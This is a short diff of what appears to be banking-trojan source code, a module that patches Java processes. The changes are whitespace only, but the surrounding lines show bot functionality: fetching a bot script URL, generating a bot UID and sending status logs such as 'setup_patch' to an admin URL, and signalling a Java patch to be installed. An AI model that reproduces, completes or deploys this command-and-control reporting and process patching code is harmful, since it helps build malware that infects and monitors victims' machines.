@@ -153,7 +153,7 @@ static PCHAR GetJavaPatcherURL()
 		#ifdef JavaConfigH
 			URL = GetJavaScriptURL(0);//JavaPatcherURLPath);
 		#else
-			URL = GetBotScriptURL(0, 0);//JavaPatcherURLPath); 
+			URL = GetBotScriptURL(0, 0);//JavaPatcherURLPath);
 		#endif
 		if (URL == NULL)
         	pSleep(60000);
@@ -195,7 +195,7 @@ void SendLogToAdmin( const char* c, const char* v )
 {
 	char botUid[100];
 	GenerateUid(botUid);
-	PCHAR adminUrl = GetJavaPatcherURL(); 
+	PCHAR adminUrl = GetJavaPatcherURL();
 	SendLogToAdmin( adminUrl, botUid, c, v );
 	STR::Free(adminUrl);
 }
@@ -1164,10 +1164,12 @@ void JavaPatcherAddPidToFile()
 // Функция сигнализирует о необходимости запуска патчей
 void  JavaPatcherSignal()
 {
+
 	if( PatchIsLoaded() ) return; //если патч установлен, то не нужно его повторно ставить
+
 	SendLogToAdmin( "setup_patch", "0" );
 
-    JavaPatcherAddPidToFile();
+	JavaPatcherAddPidToFile();
 
 	char SignalFile[MAX_PATH];
 	if( GetWorkFolder( SignalFile, JavaPatcherSignalFile ) )
